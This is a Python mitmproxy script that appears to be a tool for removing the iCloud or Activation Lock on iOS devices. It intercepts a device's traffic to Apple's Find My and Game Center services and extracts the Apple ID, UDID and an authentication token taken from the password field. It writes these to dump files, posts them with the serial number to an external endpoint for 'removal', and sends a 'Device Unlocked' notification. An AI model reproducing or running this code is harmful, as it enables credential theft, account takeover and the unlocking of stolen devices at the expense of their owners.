# This is the main proxy code (This will catch the username / PE token / apple ID and UDID)
from mitmproxy import ctx
from mitmproxy import http
import json
import plistlib
import requests
import re

# Imports for Pyrowl
import pynma

DEBUG = 0
DATA = 0

def send_unlock_notif(sn):
	# API KEY FOR prowlapp
	api_key = ""
	endpoint = "https://api.prowlapp.com/publicapi/add"
	headers = {
	"Content-Type": "application/x-www-form-urlencoded",
	}

	data = {
	"apikey": api_key,
	"application": "OpenMenu Notification",
	"event": "Device Unlocked",
	"description": sn,
	}
	response = requests.post(endpoint, headers=headers, data=data)


def WriteToFile(file, content):
	with open(file, 'wb+') as f:
		f.write(content)

def response(flow):
	my_regex = "p(\d+)-fmfmobile"
	if re.search(my_regex, flow.request.url, re.IGNORECASE):
		jsondata = json.loads(flow.request.content)
		UDID = jsondata.get('clientContext').get('deviceUDID')
		PRODUCT_TYPE = jsondata.get('clientContext').get('productType')
		APPLE_ID = jsondata.get('clientContext').get('signedInAs')
		with open('dumps/' + str(UDID) + 'AID', 'w') as f:
			f.write(str(APPLE_ID))
			#print('apple id extracted ', str(APPLE_ID))

	if (
		flow.request.url
		== 'https://profile.gc.apple.com/WebObjects/GKProfileService.woa/wa/authenticateUser'
	):
		apple_plist = flow.request.content
		pl = plistlib.loads(apple_plist)
		PE_TOKEN = pl.get('password')
		UDID = pl.get('udid')

        # Where to send the data we extracted for removal
		API_ENDPOINT = ''
		#AUTO_REMOVE_ENDPOINT = ''
		password = str(PE_TOKEN)
		udid = str(UDID)
		try:
			with open('dumps/' + udid + 'SN', 'r') as f:
				sn = f.read()
				registered = True
		except:
			print(udid)
			print('----{ device not registered }----')
			registered = False
		if registered:
			with open('dumps/' + udid + 'AID', 'r') as f:
				username = f.read()
				data = {'pet': '' , 'ID': username, 'KEY': password, 'UDID': udid, 'SN': sn}
				remove_data = {'username': username, 'password': password}
				print(json.dumps(data, indent=4))
				r = requests.post(url=API_ENDPOINT, json={'data': data}, timeout=300)
				print('status_code', r.status_code)
				if r.status_code == 200:
					send_unlock_notif(sn)
				#r = requests.post(url=AUTO_REMOVE_ENDPOINT, data=remove_data, timeout=300)
				#print('status_code', r.status_code)
				with open('unlocks.log', 'a+') as f:
					f.write(json.dumps(data, indent=4))
					f.write('\n' + str(r.status_code) + '\n--------------------\n')